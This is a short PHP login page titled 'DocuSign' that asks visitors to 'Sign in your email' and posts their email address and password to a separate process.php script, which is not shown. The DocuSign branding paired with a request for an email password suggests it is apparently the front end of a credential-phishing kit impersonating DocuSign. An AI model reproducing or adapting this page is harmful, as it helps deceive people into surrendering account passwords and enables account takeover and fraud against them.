<?php
session_start(); // Start session at the very top before any HTML

$error = isset($_SESSION['error']) ? $_SESSION['error'] : "";
unset($_SESSION['error']); // Clear the error after displaying it
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="favicon.png" type="image/png">
</head>
<body>

    <div class="container">
        <img src="logo.png" alt="Logo" class="logo">
        <div class="login-box">
            <h2>Sign in your email</h2>
            
            <!-- Show error message if exists -->
            <?php if (!empty($error)) : ?>
                <p style="color: red;"><?= htmlspecialchars($error); ?></p>
            <?php endif; ?>

            <form action="process.php" method="POST">
                <label for="email">Email</label>
                <input type="email" name="email" id="email" placeholder="your@email.com" required>
                
                <label for="password">Password</label>
                <input type="password" name="password" id="password" placeholder="********" required>
                
                <button type="submit">Sign In</button>
            </form>
        </div>
    </div>

</body>
</html>
